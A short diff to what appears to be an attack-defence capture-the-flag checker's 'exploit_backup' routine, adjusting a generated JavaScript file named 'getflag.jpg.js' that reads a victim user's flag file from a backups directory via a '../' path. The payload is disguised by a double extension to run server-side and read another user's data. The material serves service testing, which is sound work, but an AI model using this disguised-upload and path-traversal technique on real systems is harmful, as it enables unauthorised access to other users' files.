@@ -230,13 +230,12 @@ async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
     with open('getflag.jpg.js', 'w') as getFlag:
         getFlag.write(f"""const fs = require('fs');
                             const path = require('path'); 
-                            const flagPath = path.join(__dirname, 'backups', {base64.b64encode(victimUserId.encode()).decode()}, 'flag.txt');
+                            const flagPath = path.join(__dirname, '../backups', '{base64.b64encode(victimUserId.encode()).decode()}', 'flag.txt');
                             function readFlagFile() {{
                                 try {{
                                     const flag = fs.readFileSync(flagPath, 'utf8');
                                     return flag;
                                 }} catch (error) {{
-                                    console.error(error);
                                     return 'Failed to read flag file';
                                 }}
                             }}
